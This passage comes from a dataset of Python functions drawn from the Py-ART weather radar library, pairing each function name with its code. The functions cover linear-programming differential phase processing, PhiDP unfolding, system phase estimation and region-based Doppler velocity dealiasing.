    soln = smooth_and_trim_scan(soln, window_len=5, window='sg_smooth')
    return soln"
ARM-DOE/pyart,LP_solver_cylp,"def LP_solver_cylp(A_Matrix, B_vectors, weights, really_verbose=False):
    """"""
    Solve the Linear Programming problem given in Giangrande et al, 2012 using
    the CyLP module.

    Parameters
    ----------
    A_Matrix : matrix
        Row augmented A matrix, see :py:func:`construct_A_matrix`
    B_vectors : matrix
        Matrix containing B vectors, see :py:func:`construct_B_vectors`
    weights : array
        Weights.
    really_verbose : bool, optional
        True to print CLP messaging. False to suppress.

    Returns
    -------
    soln : array
        Solution to LP problem.

    See Also
    --------
    LP_solver_cvxopt : Solve LP problem using the CVXOPT module.
    LP_solver_pyglpk : Solve LP problem using the PyGLPK module.

    """"""
    from cylp.cy.CyClpSimplex import CyClpSimplex
    from cylp.py.modeling.CyLPModel import CyLPArray, CyLPModel
    n_gates = weights.shape[1] // 2
    n_rays = B_vectors.shape[0]
    soln = np.zeros([n_rays, n_gates])
    model = CyLPModel()
    G = np.matrix(A_Matrix)
    h = CyLPArray(np.empty(B_vectors.shape[1]))
    x = model.addVariable('x', G.shape[1])
    model.addConstraint(G * x >= h)
    c = CyLPArray(np.squeeze(weights[0]))
    model.objective = c * x
    s = CyClpSimplex(model)
    if not really_verbose:
        s.logLevel = 0
    for raynum in range(n_rays):
        s.setRowLowerArray(np.squeeze(np.asarray(B_vectors[raynum])))
        s.dual()
        soln[raynum, :] = s.primalVariableSolution['x'][n_gates:2 * n_gates]
    soln = smooth_and_trim_scan(soln, window_len=5, window='sg_smooth')
    return soln"
ARM-DOE/pyart,phase_proc_lp,"def phase_proc_lp(radar, offset, debug=False, self_const=60000.0, low_z=10.0, high_z=53.0, min_phidp=0.01, min_ncp=0.5, min_rhv=0.8, fzl=4000.0, sys_phase=0.0, overide_sys_phase=False, nowrap=None, really_verbose=False, LP_solver='pyglpk', refl_field=None, ncp_field=None, rhv_field=None, phidp_field=None, kdp_field=None, unf_field=None, window_len=35, proc=1, coef=0.914):
    """"""
    Phase process using a LP method [1].

    Parameters
    ----------
    radar : Radar
        Input radar.
    offset : float
        Reflectivity offset in dBz.
    debug : bool, optional
        True to print debugging information.
    self_const : float, optional
        Self consistency factor.
    low_z : float, optional
        Low limit for reflectivity. Reflectivity below this value is set to
        this limit.
    high_z : float, optional
        High limit for reflectivity. Reflectivity above this value is set to
        this limit.
    min_phidp : float, optional
        Minimum Phi differential phase.
    min_ncp : float, optional
        Minimum normal coherent power.
    min_rhv : float, optional
        Minimum copolar coefficient.
    fzl : float, optional
        Maximum altitude.
    sys_phase : float, optional
        System phase in degrees.
    overide_sys_phase : bool, optional
        True to use `sys_phase` as the system phase. False will calculate a
        value automatically.
    nowrap : int or None, optional
        Gate number to begin phase unwrapping. None will unwrap all phases.
    really_verbose : bool, optional
        True to print LPX messaging. False to suppress.
    LP_solver : 'pyglpk' or 'cvxopt', 'cylp', or 'cylp_mp', optional
        Module to use to solve LP problem. Default is 'pyglpk'.
    refl_field, ncp_field, rhv_field, phidp_field, kdp_field : str, optional
        Name of field in radar which contains the horizonal reflectivity,
        normal coherent power, copolar coefficient, differential phase shift,
        and differential phase. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART configuration
        file.
    unf_field : str, optional
        Name of field which will be added to the radar object which will
        contain the unfolded differential phase. Metadata for this field
        will be taken from the phidp_field. A value of None will use
        the default field name as defined in the Py-ART configuration file.
    window_len : int, optional
        Length of Sobel window applied to PhiDP field when prior to
        calculating KDP.
    proc : int, optional
        Number of worker processes, only used when `LP_solver` is 'cylp_mp'.
    coef : float, optional
        Exponent linking Z to KDP in self consistency. kdp=(10**(0.1z))*coef

    Returns
    -------
    reproc_phase : dict
        Field dictionary containing processed differential phase shifts.
    sob_kdp : dict
        Field dictionary containing recalculated differential phases.

    References
    ----------
    [1] Giangrande, S.E., R. McGraw, and L. Lei. An Application of
    Linear Programming to Polarimetric Radar Differential Phase Processing.
    J. Atmos. and Oceanic Tech, 2013, 30, 1716.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if ncp_field is None:
        ncp_field = get_field_name('normalized_coherent_power')
    if rhv_field is None:
        rhv_field = get_field_name('cross_correlation_ratio')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if unf_field is None:
        unf_field = get_field_name('unfolded_differential_phase')
    refl = copy.deepcopy(radar.fields[refl_field]['data']) + offset
    is_low_z = refl < low_z
    is_high_z = refl > high_z
    refl[np.where(is_high_z)] = high_z
    refl[np.where(is_low_z)] = low_z
    z_mod = refl
    if debug:
        print('Unfolding')
    my_unf = get_phidp_unf(radar, ncp_lev=min_ncp, rhohv_lev=min_rhv, debug=debug, ncpts=2, doc=None, sys_phase=sys_phase, nowrap=nowrap, overide_sys_phase=overide_sys_phase, refl_field=refl_field, ncp_field=ncp_field, rhv_field=rhv_field, phidp_field=phidp_field)
    my_new_ph = copy.deepcopy(radar.fields[phidp_field])
    my_unf[:, -1] = my_unf[:, -2]
    my_new_ph['data'] = my_unf
    radar.fields.update({unf_field: my_new_ph})
    phidp_mod = copy.deepcopy(radar.fields[unf_field]['data'])
    phidp_neg = phidp_mod < min_phidp
    phidp_mod[np.where(phidp_neg)] = min_phidp
    proc_ph = copy.deepcopy(radar.fields[phidp_field])
    proc_ph['data'] = phidp_mod
    St_Gorlv_differential_5pts = [-0.2, -0.1, 0, 0.1, 0.2]
    for sweep in range(len(radar.sweep_start_ray_index['data'])):
        if debug:
            print('Doing ', sweep)
        (end_gate, start_ray, end_ray) = det_process_range(radar, sweep, fzl, doc=15)
        start_gate = 0
        A_Matrix = construct_A_matrix(len(radar.range['data'][start_gate:end_gate]), St_Gorlv_differential_5pts)
        B_vectors = construct_B_vectors(phidp_mod[start_ray:end_ray, start_gate:end_gate], z_mod[start_ray:end_ray, start_gate:end_gate], St_Gorlv_differential_5pts, dweight=self_const, coef=coef)
        weights = np.ones(phidp_mod[start_ray:end_ray, start_gate:end_gate].shape)
        nw = np.bmat([weights, np.zeros(weights.shape)])
        if LP_solver == 'pyglpk':
            mysoln = LP_solver_pyglpk(A_Matrix, B_vectors, nw, really_verbose=really_verbose)
        elif LP_solver == 'cvxopt':
            mysoln = LP_solver_cvxopt(A_Matrix, B_vectors, nw)
        elif LP_solver == 'cylp':
            mysoln = LP_solver_cylp(A_Matrix, B_vectors, nw, really_verbose=really_verbose)
        elif LP_solver == 'cylp_mp':
            mysoln = LP_solver_cylp_mp(A_Matrix, B_vectors, nw, really_verbose=really_verbose, proc=proc)
        else:
            raise ValueError('unknown LP_solver:' + LP_solver)
        proc_ph['data'][start_ray:end_ray, start_gate:end_gate] = mysoln
    last_gates = proc_ph['data'][start_ray:end_ray, -16]
    proc_ph['data'][start_ray:end_ray, -16:] = np.meshgrid(np.ones([16]), last_gates)[1]
    proc_ph['valid_min'] = 0.0
    proc_ph['valid_max'] = 400.0
    sobel = 2.0 * np.arange(window_len) / (window_len - 1.0) - 1.0
    sobel = sobel / abs(sobel).sum()
    sobel = sobel[::-1]
    gate_spacing = (radar.range['data'][1] - radar.range['data'][0]) / 1000.0
    kdp = scipy.ndimage.convolve1d(proc_ph['data'], sobel, axis=1) / (window_len / 3.0 * 2.0 * gate_spacing)
    if kdp_field in radar.fields:
        sob_kdp = copy.deepcopy(radar.fields[kdp_field])
    else:
        sob_kdp = get_metadata(kdp_field)
    sob_kdp['data'] = kdp
    sob_kdp['_FillValue'] = get_fillvalue()
    return (proc_ph, sob_kdp)"
ARM-DOE/pyart,phase_proc_lp_gf,"def phase_proc_lp_gf(radar, gatefilter=None, debug=False, self_const=60000.0, low_z=10.0, high_z=53.0, min_phidp=0.01, fzl=4000.0, system_phase=None, nowrap=None, really_verbose=False, LP_solver='pyglpk', refl_field=None, phidp_field=None, kdp_field=None, unf_field=None, window_len=35, proc=1, coef=0.914, ncpts=None, first_gate_sysp=None, offset=0.0, doc=0):
    """"""
    Phase process using a LP method [1] using Py-ART's Gatefilter.

    Parameters
    ----------
    radar : Radar
        Input radar.
    gatefilter : Gatefilter, optional
        Py-ART gatefilter object indicating where processing should be
        carried out
    debug : bool, optional
        True to print debugging information.
    self_const : float, optional
        Self consistency factor.
    low_z : float, optional
        Low limit for reflectivity. Reflectivity below this value is set to
        this limit.
    high_z : float, optional
        High limit for reflectivity. Reflectivity above this value is set to
        this limit.
    fzl : float, optional
        Maximum altitude.
    system_phase : float, optional
        System phase in degrees.
    nowrap : int or None, optional
        Gate number to begin phase unwrapping. None will unwrap all phases.
    really_verbose : bool, optional
        True to print LPX messaging. False to suppress.
    LP_solver : 'pyglpk' or 'cvxopt', 'cylp', or 'cylp_mp', optional
        Module to use to solve LP problem. Default is 'pyglpk'.
    refl_field, ncp_field, rhv_field, phidp_field, kdp_field : str, optional
        Name of field in radar which contains the horizonal reflectivity,
        normal coherent power, copolar coefficient, differential phase shift,
        and differential phase. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART configuration
        file.
    unf_field : str, optional
        Name of field which will be added to the radar object which will
        contain the unfolded differential phase. Metadata for this field
        will be taken from the phidp_field. A value of None will use
        the default field name as defined in the Py-ART configuration file.
    window_len : int, optional
        Length of Sobel window applied to PhiDP field when prior to
        calculating KDP.
    proc : int, optional
        Number of worker processes, only used when `LP_solver` is 'cylp_mp'.
    coef : float, optional
        Exponent linking Z to KDP in self consistency. kdp=(10**(0.1z))*coef
    ncpts : int, optional
        Minimum number of points in a ray. Regions within a ray smaller than
        this or beginning before this gate number are excluded from unfolding.
    offset : float, optional
        Reflectivity offset to add in dBz.
    doc : int, optional
        Number of gates to ""doc"" off the end of a ray.

    Returns
    -------
    reproc_phase : dict
        Field dictionary containing processed differential phase shifts.
    sob_kdp : dict
        Field dictionary containing recalculated differential phases.

    References
    ----------
    [1] Giangrande, S.E., R. McGraw, and L. Lei. An Application of
    Linear Programming to Polarimetric Radar Differential Phase Processing.
    J. Atmos. and Oceanic Tech, 2013, 30, 1716.

    """"""
    if refl_field is None:
        refl_field = get_field_name('reflectivity')
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    if kdp_field is None:
        kdp_field = get_field_name('specific_differential_phase')
    if unf_field is None:
        unf_field = get_field_name('unfolded_differential_phase')
    if gatefilter is None:
        gatefilter = GateFilter(radar)
        gatefilter.include_all()
    refl = copy.deepcopy(radar.fields[refl_field]['data']) + offset
    is_low_z = refl < low_z
    is_high_z = refl > high_z
    refl[np.where(is_high_z)] = high_z
    refl[np.where(is_low_z)] = low_z
    z_mod = refl
    if debug:
        print('Unfolding')
    my_unf = get_phidp_unf_gf(radar, gatefilter, debug=debug, ncpts=ncpts, sys_phase=system_phase, nowrap=nowrap, phidp_field=phidp_field, first_gate_sysp=first_gate_sysp)
    my_new_ph = copy.deepcopy(radar.fields[phidp_field])
    my_unf[:, -1] = my_unf[:, -2]
    my_new_ph['data'] = my_unf
    radar.fields.update({unf_field: my_new_ph})
    phidp_mod = copy.deepcopy(radar.fields[unf_field]['data'])
    phidp_neg = phidp_mod < min_phidp
    phidp_mod[np.where(phidp_neg)] = min_phidp
    proc_ph = copy.deepcopy(radar.fields[phidp_field])
    proc_ph['data'] = phidp_mod
    St_Gorlv_differential_5pts = [-0.2, -0.1, 0, 0.1, 0.2]
    for sweep in range(len(radar.sweep_start_ray_index['data'])):
        if debug:
            print('Doing ', sweep)
        (end_gate, start_ray, end_ray) = det_process_range(radar, sweep, fzl, doc=doc)
        start_gate = 0
        if len(radar.range['data'][start_gate:end_gate]) <= 5:
            mysoln = np.zeros_like(proc_ph['data'][start_ray:end_ray, start_gate:end_gate])
            proc_ph['data'][start_ray:end_ray, start_gate:end_gate] = mysoln
            continue
        A_Matrix = construct_A_matrix(len(radar.range['data'][start_gate:end_gate]), St_Gorlv_differential_5pts)
        B_vectors = construct_B_vectors(phidp_mod[start_ray:end_ray, start_gate:end_gate], z_mod[start_ray:end_ray, start_gate:end_gate], St_Gorlv_differential_5pts, dweight=self_const, coef=coef)
        weights = np.ones(phidp_mod[start_ray:end_ray, start_gate:end_gate].shape)
        nw = np.bmat([weights, np.zeros(weights.shape)])
        if LP_solver == 'pyglpk':
            mysoln = LP_solver_pyglpk(A_Matrix, B_vectors, nw, really_verbose=really_verbose)
        elif LP_solver == 'cvxopt':
            mysoln = LP_solver_cvxopt(A_Matrix, B_vectors, nw)
        elif LP_solver == 'cylp':
            mysoln = LP_solver_cylp(A_Matrix, B_vectors, nw, really_verbose=really_verbose)
        elif LP_solver == 'cylp_mp':
            mysoln = LP_solver_cylp_mp(A_Matrix, B_vectors, nw, really_verbose=really_verbose, proc=proc)
        else:
            raise ValueError('unknown LP_solver:' + LP_solver)
        proc_ph['data'][start_ray:end_ray, start_gate:end_gate] = mysoln
    last_gates = proc_ph['data'][start_ray:end_ray, -16]
    proc_ph['data'][start_ray:end_ray, -16:] = np.meshgrid(np.ones([16]), last_gates)[1]
    proc_ph['valid_min'] = 0.0
    proc_ph['valid_max'] = 400.0
    sobel = 2.0 * np.arange(window_len) / (window_len - 1.0) - 1.0
    sobel = sobel / abs(sobel).sum()
    sobel = sobel[::-1]
    gate_spacing = (radar.range['data'][1] - radar.range['data'][0]) / 1000.0
    kdp = scipy.ndimage.convolve1d(proc_ph['data'], sobel, axis=1) / (window_len / 3.0 * 2.0 * gate_spacing)
    if kdp_field in radar.fields:
        sob_kdp = copy.deepcopy(radar.fields[kdp_field])
    else:
        sob_kdp = get_metadata(kdp_field)
    sob_kdp['data'] = kdp
    sob_kdp['_FillValue'] = get_fillvalue()
    return (proc_ph, sob_kdp)"
ARM-DOE/pyart,get_phidp_unf_gf,"def get_phidp_unf_gf(radar, gatefilter, debug=False, ncpts=2, sys_phase=None, nowrap=None, phidp_field=None, first_gate_sysp=None):
    """"""
    Get Unfolded Phi differential phase in areas not gatefiltered.

    Parameters
    ----------
    radar : Radar
        The input radar.
    gatefilter : GateFilter
        Only apply on areas incuded in the gatefilter
    debug : bool, optioanl
        True to print debugging information, False to supress printing.
    ncpts : int, optional
        Minimum number of points in a ray. Regions within a ray smaller than
        this or beginning before this gate number are excluded from
        calculations.
    sys_phase : float, optional
        System phase overide.
    nowrap : int or None, optional
        Gate number where unwrapping should begin. `None` will unwrap all
        gates.
    refl_field ncp_field, rhv_field, phidp_field : str, optional
        Field names within the radar object which represent the horizontal
        reflectivity, normal coherent power, the copolar coefficient, and the
        differential phase shift. A value of None for any of these parameters
        will use the default field name as defined in the Py-ART
        configuration file.

    Returns
    -------
    cordata : array
        Unwrapped phi differential phase.

    """"""
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    t = time()
    my_phidp = radar.fields[phidp_field]['data']
    if sys_phase is not None:
        system_zero = sys_phase
    else:
        system_zero = det_sys_phase_gf(radar, gatefilter, phidp_field=phidp_field, first_gate=first_gate_sysp)
        if system_zero is None:
            system_zero = -135
    cordata = np.zeros(my_phidp.shape, dtype=float)
    all_non_meteo = gatefilter.gate_excluded
    for radial in range(my_phidp.shape[0]):
        notmeteo = all_non_meteo[radial, :]
        x_ma = ma.masked_where(notmeteo, my_phidp[radial, :])
        try:
            ma.notmasked_contiguous(x_ma)
            for slc in ma.notmasked_contiguous(x_ma):
                if slc.stop - slc.start < ncpts or slc.start < ncpts:
                    x_ma.mask[slc.start - 1:slc.stop + 1] = True
            c = 0
        except TypeError:
            c = 1
            x_ma.mask = True
        except AttributeError:
            c = 1
            x_ma.mask = True
        if nowrap is not None:
            unwrapped = copy.deepcopy(x_ma)
            end_unwrap = unwrap_masked(x_ma[nowrap:], centered=False)
            unwrapped[nowrap:] = end_unwrap
        else:
            unwrapped = unwrap_masked(x_ma, centered=False)
        system_max = unwrapped[np.where(np.logical_not(notmeteo))][-10:-1].mean() - system_zero
        unwrapped_fixed = np.zeros(len(x_ma), dtype=float)
        based = unwrapped - system_zero
        based[0] = 0.0
        notmeteo[0] = False
        based[-1] = system_max
        notmeteo[-1] = False
        unwrapped_fixed[np.where(np.logical_not(based.mask))[0]] = based[np.where(np.logical_not(based.mask))[0]]
        if len(based[np.where(np.logical_not(based.mask))[0]]) > 11:
            unwrapped_fixed[np.where(based.mask)[0]] = np.interp(np.where(based.mask)[0], np.where(np.logical_not(based.mask))[0], smooth_and_trim(based[np.where(np.logical_not(based.mask))[0]]))
        else:
            unwrapped_fixed[np.where(based.mask)[0]] = np.interp(np.where(based.mask)[0], np.where(np.logical_not(based.mask))[0], based[np.where(np.logical_not(based.mask))[0]])
        if c != 1:
            cordata[radial, :] = unwrapped_fixed
        else:
            cordata[radial, :] = np.zeros(my_phidp.shape[1])
    if debug:
        print('Exec time: ', time() - t)
    return cordata"
ARM-DOE/pyart,det_sys_phase_gf,"def det_sys_phase_gf(radar, gatefilter, phidp_field=None, first_gate=30.0):
    """"""
    Determine the system phase.

    Parameters
    ----------
    radar : Radar
        Radar object for which to determine the system phase.
    gatefilter : Gatefilter
        Gatefilter object highlighting valid gates.
    phidp_field : str, optional
        Field name within the radar object which represents
        differential phase shift. A value of None will use the default
        field name as defined in the Py-ART configuration file.
    first_gate : int, optional
        Gate index for where to being applying the gatefilter.

    Returns
    -------
    sys_phase : float or None
        Estimate of the system phase. None is not estimate can be made.

    """"""
    if phidp_field is None:
        phidp_field = get_field_name('differential_phase')
    phidp = radar.fields[phidp_field]['data'][:, first_gate:]
    last_ray_idx = radar.sweep_end_ray_index['data'][0]
    is_meteo = gatefilter.gate_included[:, first_gate:]
    return _det_sys_phase_gf(phidp, last_ray_idx, is_meteo)"
ARM-DOE/pyart,_det_sys_phase_gf,"def _det_sys_phase_gf(phidp, last_ray_idx, radar_meteo):
    """"""Determine the system phase, see :py:func:`det_sys_phase`.""""""
    good = False
    phases = []
    for radial in range(last_ray_idx + 1):
        meteo = radar_meteo[radial, :]
        mpts = np.where(meteo)
        if len(mpts[0]) > 25:
            good = True
            msmth_phidp = smooth_and_trim(phidp[radial, mpts[0]], 9)
            phases.append(msmth_phidp[0:25].min())
    if not good:
        return None
    return np.median(phases)"
ARM-DOE/pyart,worker,"def worker(model, B_vectors, weights, ray, chunksize, out_q):
    """"""
        The worker function, invoked in a process.
        The results are placed in a dictionary that's pushed to a queue.
        """"""
    outdict = {}
    iray = int(ray / chunksize)
    outdict[iray] = solve_cylp(model, B_vectors, weights, ray, chunksize)
    out_q.put(outdict)"
ARM-DOE/pyart,dealias_region_based,"def dealias_region_based(radar, ref_vel_field=None, interval_splits=3, interval_limits=None, skip_between_rays=100, skip_along_ray=100, centered=True, nyquist_vel=None, check_nyquist_uniform=True, gatefilter=False, rays_wrap_around=None, keep_original=False, set_limits=True, vel_field=None, corr_vel_field=None, **kwargs):
    """"""
    Dealias Doppler velocities using a region based algorithm.

    Performs Doppler velocity dealiasing by finding regions of similar
    velocities and unfolding and merging pairs of regions until all
    regions are unfolded. Unfolding and merging regions is accomplished by
    modeling the problem as a dynamic network reduction.

    Parameters
    ----------
    radar : Radar
        Radar object containing Doppler velocities to dealias.
    ref_vel_field : str or None, optional
         Field in radar containing a reference velocity field used to anchor
         the unfolded velocities once the algorithm completes. Typically this
         field is created by simulating the radial velocities from wind data
         from an atmospheric sonding using
         :py:func:`pyart.util.simulated_vel_from_profile`.
    interval_splits : int, optional
        Number of segments to split the nyquist interval into when finding
        regions of similar velocity. More splits creates a larger number of
        initial regions which takes longer to process but may result in better
        dealiasing. The default value of 3 seems to be a good compromise
        between performance and artifact free dealiasing. This value
        is not used if the interval_limits parameter is not None.
    interval_limits : array like or None, optional
        Velocity limits used for finding regions of similar velocity. Should
        cover the entire nyquist interval. None, the default value, will
        split the Nyquist interval into interval_splits equal sized
        intervals.
    skip_between_rays, skip_along_ray : int, optional
        Maximum number of filtered gates to skip over when joining regions,
        gaps between region larger than this will not be connected. Parameters
        specify the maximum number of filtered gates between and along a ray.
        Set these parameters to 0 to disable unfolding across filtered gates.
    centered : bool, optional
        True to apply centering to each sweep after the dealiasing algorithm
        so that the average number of unfolding is near 0. False does not
        apply centering which may results in individual sweeps under or over
        folded by the nyquist interval.
    nyquist_velocity : array like or float, optional
        Nyquist velocity in unit identical to those stored in the radar's
        velocity field, either for each sweep or a single value which will be
        used for all sweeps. None will attempt to determine this value from
        the Radar object.
    check_nyquist_uniform : bool, optional
        True to check if the Nyquist velocities are uniform for all rays
        within a sweep, False will skip this check. This parameter is ignored
        when the nyquist_velocity parameter is not None.
    gatefilter : GateFilter, None or False, optional.
        A GateFilter instance which specified which gates should be
        ignored when performing de-aliasing. A value of None created this
        filter from the radar moments using any additional arguments by
        passing them to :py:func:`moment_based_gate_filter`. False, the
        default, disables filtering including all gates in the dealiasing.
    rays_wrap_around : bool or None, optional
        True when the rays at the beginning of the sweep and end of the sweep
        should be interpreted as connected when de-aliasing (PPI scans).
        False if they edges should not be interpreted as connected (other scan
        types). None will determine the correct value from the radar
        scan type.
    keep_original : bool, optional
        True to retain the original Doppler velocity values at gates
        where the dealiasing procedure fails or was not applied. False
        does not replacement and these gates will be masked in the corrected
        velocity field.
    set_limits : bool, optional
        True to set valid_min and valid_max elements in the returned
        dictionary. False will not set these dictionary elements.
    vel_field : str, optional
        Field in radar to use as the Doppler velocities during dealiasing.
        None will use the default field name from the Py-ART configuration
        file.
    corr_vel_field : str, optional
        Name to use for the dealiased Doppler velocity field metadata. None
        will use the default field name from the Py-ART configuration file.

    Returns
    -------
    corr_vel : dict
        Field dictionary containing dealiased Doppler velocities. Dealiased
        array is stored under the 'data' key.

    """"""
    (vel_field, corr_vel_field) = _parse_fields(vel_field, corr_vel_field)
    gatefilter = _parse_gatefilter(gatefilter, radar, **kwargs)
    rays_wrap_around = _parse_rays_wrap_around(rays_wrap_around, radar)
    nyquist_vel = _parse_nyquist_vel(nyquist_vel, radar, check_nyquist_uniform)
    if ref_vel_field is None:
        ref_vdata = None
    else:
        ref_vdata = radar.fields[ref_vel_field]['data']
    gatefilter.exclude_masked(vel_field)
    gatefilter.exclude_invalid(vel_field)
    gfilter = gatefilter.gate_excluded
    vdata = radar.fields[vel_field]['data'].view(np.ndarray)
    data = vdata.copy()
    for (nsweep, sweep_slice) in enumerate(radar.iter_slice()):
        sdata = vdata[sweep_slice].copy()
        scorr = data[sweep_slice]
        sfilter = gfilter[sweep_slice]
        nyquist_interval = nyquist_vel[nsweep] * 2.0
        if interval_limits is None:
            nvel = nyquist_vel[nsweep]
            valid_sdata = sdata[~sfilter]
            s_interval_limits = _find_sweep_interval_splits(nvel, interval_splits, valid_sdata, nsweep)
        else:
            s_interval_limits = interval_limits
        (labels, nfeatures) = _find_regions(sdata, sfilter, s_interval_limits)
        if nfeatures < 2:
            continue
        bincount = np.bincount(labels.ravel())
        num_masked_gates = bincount[0]
        region_sizes = bincount[1:]
        (indices, edge_count, velos) = _edge_sum_and_count(labels, num_masked_gates, sdata, rays_wrap_around, skip_between_rays, skip_along_ray)
        if len(edge_count) == 0:
            continue
        region_tracker = _RegionTracker(region_sizes)
        edge_tracker = _EdgeTracker(indices, edge_count, velos, nyquist_interval, nfeatures + 1)
        while True:
            if _combine_regions(region_tracker, edge_tracker):
                break
        if centered:
            gates_dealiased = region_sizes.sum()
            total_folds = np.sum(region_sizes * region_tracker.unwrap_number[1:])
            sweep_offset = int(round(float(total_folds) / gates_dealiased))
            if sweep_offset != 0:
                region_tracker.unwrap_number -= sweep_offset
        nwrap = np.take(region_tracker.unwrap_number, labels)
        scorr += nwrap * nyquist_interval
        if ref_vdata is not None:
            sref = ref_vdata[sweep_slice]
            gfold = (sref - scorr).mean() / nyquist_interval
            gfold = np.ma.round(gfold)
            new_interval_limits = np.linspace(scorr.min(), scorr.max(), 10)
            (labels_corr, nfeatures_corr) = _find_regions(scorr, sfilter, new_interval_limits)
            if nfeatures_corr < 2:
                scorr = scorr + gfold * nyquist_interval
            else:
                bounds_list = [(x, y) for (x, y) in zip(-6 * np.ones(nfeatures_corr), 5 * np.ones(nfeatures_corr))]
                scorr_means = np.zeros(nfeatures_corr)
                sref_means = np.zeros(nfeatures_corr)
                for reg in range(1, nfeatures_corr + 1):
                    scorr_means[reg - 1] = np.ma.mean(scorr[labels_corr == reg])
                    sref_means[reg - 1] = np.ma.mean(sref[labels_corr == reg])

                def cost_function(x):
                    return _cost_function(x, scorr_means, sref_means, nyquist_interval, nfeatures_corr)

                def gradient(x):
                    return _gradient(x, scorr_means, sref_means, nyquist_interval, nfeatures_corr)
                nyq_adjustments = fmin_l_bfgs_b(cost_function, gfold * np.ones(nfeatures_corr), disp=True, fprime=gradient, bounds=bounds_list, maxiter=200, pgtol=nyquist_interval)
                i = 0
                for reg in range(1, nfeatures_corr):
                    scorr[labels == reg] += nyquist_interval * np.round(nyq_adjustments[0][i])
                    i = i + 1
    fill_value = radar.fields[vel_field].get('_FillValue', get_fillvalue())
    if np.any(gfilter):
        data = np.ma.array(data, mask=gfilter, fill_value=fill_value)
    if keep_original:
        data[gfilter] = radar.fields[vel_field]['data'][gfilter]
    corr_vel = get_metadata(corr_vel_field)
    corr_vel['data'] = data
    corr_vel['_FillValue'] = fill_value
    if set_limits:
        _set_limits(data, nyquist_vel, corr_vel)
    return corr_vel"
ARM-DOE/pyart,_find_sweep_interval_splits,"def _find_sweep_interval_splits(nyquist, interval_splits, velocities, nsweep):
    """"""Return the interval limits for a given sweep.""""""
    add_start = add_end = 0
    interval = 2.0 * nyquist / interval_splits
    if len(velocities) != 0:
        max_vel = velocities.max()
        min_vel = velocities.min()
        if max_vel > nyquist or min_vel < -nyquist:
            msg = 'Velocities outside of the Nyquist interval found in sweep %i.' % nsweep
            warnings.warn(msg, UserWarning)
            add_start = int(np.ceil((max_vel - nyquist) / interval))
            add_end = int(np.ceil(-(min_vel + nyquist) / interval))
    start = -nyquist - add_start * interval
    end = nyquist + add_end * interval
    num = interval_splits + 1 + add_start + add_end
    return np.linspace(start, end, num, endpoint=True)"
ARM-DOE/pyart,_find_regions,"def _find_regions(vel, gfilter, limits):
    """"""
    Find regions of similar velocity.

    For each pair of values in the limits array (or list) find all connected
    velocity regions within these limits.

    Parameters
    ----------
    vel : 2D ndarray
        Array containing velocity data for a single sweep.
    gfilter : 2D ndarray
        Filter indicating if a particular gate should be masked. True
        indicates the gate should be masked (excluded).
    limits : array like
        Velocity limits for region finding. For each pair of limits, taken
        from elements i and i+1 of the array, all connected regions with
        velocities within these limits will be found.

    Returns
    -------
    label : ndarray
        Interger array with each region labeled by a value. The array
        ranges from 0 to nfeatures, inclusive, where a value of 0 indicates
        masked gates and non-zero indicates a region of connected gates.
    nfeatures : int
        Number of regions found.

    """"""
    mask = ~gfilter
    label = np.zeros(vel.shape, dtype=np.int32)
    nfeatures = 0
    for (lmin, lmax) in zip(limits[:-1], limits[1:]):
        inp = (lmin <= vel) & (vel < lmax) & mask
        (limit_label, limit_nfeatures) = ndimage.label(inp)
        limit_label[np.nonzero(limit_label)] += nfeatures
        label += limit_label
        nfeatures += limit_nfeatures
    return (label, nfeatures)"
ARM-DOE/pyart,_edge_sum_and_count,"def _edge_sum_and_count(labels, num_masked_gates, data, rays_wrap_around, max_gap_x, max_gap_y):
    """"""
    Find all edges between labels regions.

    Returns the indices, count and velocities of all edges.
    """"""
    total_nodes = labels.shape[0] * labels.shape[1] - num_masked_gates
    if rays_wrap_around:
        total_nodes += labels.shape[0] * 2
    (indices, velocities) = _fast_edge_finder(labels.astype('int32'), data.astype('float32'), rays_wrap_around, max_gap_x, max_gap_y, total_nodes)
    (index1, index2) = indices
    (vel1, vel2) = velocities
    count = np.ones_like(vel1, dtype=np.int32)
    if len(vel1) == 0:
        return (([], []), [], ([], []))
    order = np.lexsort((index1, index2))
    index1 = index1[order]
    index2 = index2[order]
    vel1 = vel1[order]
    vel2 = vel2[order]
    count = count[order]
    unique_mask = (index1[1:] != index1[:-1]) | (index2[1:] != index2[:-1])
    unique_mask = np.append(True, unique_mask)
    index1 = index1[unique_mask]
    index2 = index2[unique_mask]
    (unique_inds,) = np.nonzero(unique_mask)
    vel1 = np.add.reduceat(vel1, unique_inds, dtype=vel1.dtype)
    vel2 = np.add.reduceat(vel2, unique_inds, dtype=vel2.dtype)
    count = np.add.reduceat(count, unique_inds, dtype=count.dtype)
    return ((index1, index2), count, (vel1, vel2))"
ARM-DOE/pyart,_combine_regions,"def _combine_regions(region_tracker, edge_tracker):
    """"""Returns True when done.""""""
    (status, extra) = edge_tracker.pop_edge()
    if status:
        return True
    (node1, node2, weight, diff, edge_number) = extra
    rdiff = int(np.round(diff))
    node1_size = region_tracker.get_node_size(node1)
    node2_size = region_tracker.get_node_size(node2)
    if node1_size > node2_size:
        (base_node, merge_node) = (node1, node2)
    else:
        (base_node, merge_node) = (node2, node1)
        rdiff = -rdiff
    if rdiff != 0:
        region_tracker.unwrap_node(merge_node, rdiff)
        edge_tracker.unwrap_node(merge_node, rdiff)
    region_tracker.merge_nodes(base_node, merge_node)
    edge_tracker.merge_nodes(base_node, merge_node, edge_number)
    return False"
ARM-DOE/pyart,_cost_function,"def _cost_function(nyq_vector, vels_slice_means, svels_slice_means, v_nyq_vel, nfeatures):
    """"""Cost function for minimization in region based algorithm.""""""
    cost = 0
    i = 0
    for reg in range(nfeatures):
        add_value = 0
        add_value = (vels_slice_means[reg] + np.round(nyq_vector[i]) * v_nyq_vel - svels_slice_means[reg]) ** 2
        if np.isfinite(add_value):
            cost += add_value
        i = i + 1
    return cost"
ARM-DOE/pyart,_gradient,"def _gradient(nyq_vector, vels_slice_means, svels_slice_means, v_nyq_vel, nfeatures):
    """"""Gradient of cost function for minimization
    in region based algorithm.""""""
    gradient_vector = np.zeros(len(nyq_vector))
    i = 0
    for reg in range(nfeatures):
